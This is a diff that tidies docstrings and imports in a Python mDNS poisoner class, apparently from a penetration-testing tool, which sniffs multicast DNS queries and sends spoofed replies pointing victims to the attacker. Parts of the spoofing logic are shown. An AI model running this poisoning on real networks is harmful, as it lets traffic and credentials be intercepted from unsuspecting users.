@@ -1,9 +1,7 @@
 #!/usr/bin/env python3
-from typing import Tuple
 from scapy.all import (
     DNSRR,
     DNS,
-    Ether,
     IP,
     UDP,
     sendp,
@@ -12,20 +10,19 @@ from scapy.all import (
     IPv6,
 )
 from loguru import logger
-from threading import Thread
 from colorama import Fore, Style
 from .poisonnetwork import PoisonNetwork
 
 
 class MDNS(PoisonNetwork):
-    """[ MDNS poisoner ]
+    """MDNS poisoner.
     Args:
-        ip (str): [ if of the attacker ]
-        ipv6 (str): [ ipv6 of the attacker ]
-        mac_address (str): [ mac of the attacker ]
-        iface (str): [ interface of the current subnet used ]
-        info_logger (logger): [ Logger for the output ]
-        level (logger): [ Logger level to display information ]
+        ip (str): ipv4 of the attacker.
+        ipv6 (str): ipv6 of the attacker.
+        mac_address (str): mac of the attacker.
+        iface (str): interface of the current subnet used.
+        info_logger (logger): Logger for the output.
+        level (logger): Logger level to display information.
     """
 
     def __init__(
@@ -40,13 +37,13 @@ class MDNS(PoisonNetwork):
         super().__init__(ip, ipv6, mac_address, iface, info_logger, level)
 
     def __dns_resource_record(self, pkt: packet) -> DNSRR:
-        """[ Function to configure dns record for the response ]
+        """Method to configure dns record for the response.
 
         Args:
-            pkt (packet): [ sniffed package ]
+            pkt (packet): Sniffed package.
 
         Returns:
-            DNSRR: [ DNS record ]
+            DNSRR: DNS record.
         """
 
         return DNSRR(
@@ -59,29 +56,26 @@ class MDNS(PoisonNetwork):
         )
 
     def __transport_layer(self, response: packet) -> packet:
-        """[ Method to create the transport layer of the response packet ]
+        """Method to create the transport layer of the response packet.
 
         Args:
-            pkt (packet): [ sniffed packet ]
-            response (packet): [ Malicious packet ]
+            pkt (packet): Sniffed packet.
+            response (packet): Malicious packet.
         Returns:
-            packet: [Returns the packet modified packet]
-
-
+            packet: Returns the modified packet.
         """
 
         response /= UDP(sport="mdns", dport="mdns")
         return response
 
     def __application_layer(self, pkt: packet, response: packet) -> packet:
-        """[ Method to create the transport layer of the response packet ]
+        """Method to create the application layer of the response packet.
 
         Args:
-            pkt (packet): [ sniffed packet ]
-            response (packet): [ Malicious packet ]
+            pkt (packet): Sniffed packet.
+            response (packet): Malicious packet.
         Returns:
-            packet: [Returns the packet modified packet]
-
+            packet: Returns the modified packet.
         """
 
         response /= DNS(
@@ -103,11 +97,11 @@ class MDNS(PoisonNetwork):
         return response
 
     def __send_packet(self, response: packet, ip_of_the_packet: str) -> None:
-        """[ Function to send the malicious packet to the victim ]
+        """Method to send the malicious packet to the victim.
 
         Args:
-            response (packet): [ Malicious packet ]
-            ip_of_the_packet (str): [ ip of the victim ]
+            response (packet): Malicious packet.
+            ip_of_the_packet (str): ip of the victim.
         """
         self.info_logger.debug("Packet crafted: ")
         self.info_logger.debug(response.summary())
@@ -120,13 +114,13 @@ class MDNS(PoisonNetwork):
             self.targets_used.append(ip_of_the_packet)
 
     def __filter_for_mdns(self, pkt: packet) -> bool:
-        """[ Filter by sniffed packets of interest ]
+        """Filter by sniffed packets of interest.
 
         Args:
-            pkt (packet): [ sniffed packet ]
+            pkt (packet): Sniffed packet.
 
         Returns:
-            bool: [ If the packet is asking for a resource ]
+            bool: If the packet is asking for a network resource.
         """
         return (
             pkt.haslayer(DNS)
@@ -138,10 +132,10 @@ class MDNS(PoisonNetwork):
         )
 
     def __craft_malicious_packets(self, pkt: packet) -> None:
-        """[ Function to craft a malicious packet ]
+        """Method to craft a malicious packet.
 
         Args:
-            pkt (packet): [ Sniffed packet ]
+            pkt (packet): Sniffed packet.
         """
         if self.__filter_for_mdns(pkt):
             response = self._data_link_layer(pkt)
@@ -151,7 +145,7 @@ class MDNS(PoisonNetwork):
             self.__send_packet(response, ip_of_the_packet)
 
     def start_mdns_poisoning(self) -> None:
-        """[ Function to start the poisoner ]"""
+        """Method to start the poisoner."""
         self.info_logger.log(self.logger_level, "Starting mdns poisoning...")
         self._start_cleaner()
         sniff(
